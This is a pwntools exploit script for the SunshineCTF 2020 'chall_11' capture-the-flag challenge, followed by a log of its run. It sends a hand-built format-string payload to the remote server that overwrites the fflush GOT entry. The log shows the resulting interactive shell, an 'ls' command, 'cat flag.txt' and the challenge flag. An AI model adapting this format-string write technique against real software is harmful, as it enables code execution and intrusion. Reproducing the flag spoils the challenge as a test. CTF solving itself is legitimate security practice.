from pwn import *

e = ELF('./chall_11')

writes = {e.symbols['got.fflush']: 0xdeadbeef } #e.symbols['win']}
# 0x80484e6
#payload = fmtstr_payload(6, writes, numbwritten=1)

p = remote('chal.2020.sunshinectf.org', 30011)
#p = process('./chall_11')

p.readline()
p.send('yolo\n')

input('...')
payload = b'%260c%18$hhn%128c%19$hhn%388c%20$hhn%222c%21$hhn\x1a\x99\x04\x08\x19\x99\x04\x08\x1b\x99\x04\x08\x18\x99\x04\x08'

p.send(payload)
p.interactive()

'''
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_11'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chal.2020.sunshinectf.org on port 30011: Done
...
[*] Switching to interactive mode
$ ls
                                                                                                                                                                                                                                                                   \xc7                                                                                                                               \xa0                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 \xb7\x1a\x04\x19\x04\x1b\x99\x04\x18\x04ls
$ cat flag.txt
sun{afterlife-4b74753c2b12949f}
$
'''
